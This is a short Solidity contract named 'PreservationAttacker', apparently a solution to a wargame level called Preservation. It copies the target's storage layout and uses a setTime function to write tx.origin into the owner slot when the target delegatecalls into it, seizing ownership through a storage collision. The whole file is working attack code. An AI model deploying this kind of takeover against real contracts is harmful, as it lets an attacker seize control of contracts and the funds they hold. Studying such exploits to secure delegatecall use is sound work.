// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

contract PreservationAttacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = tx.origin;
    }
}
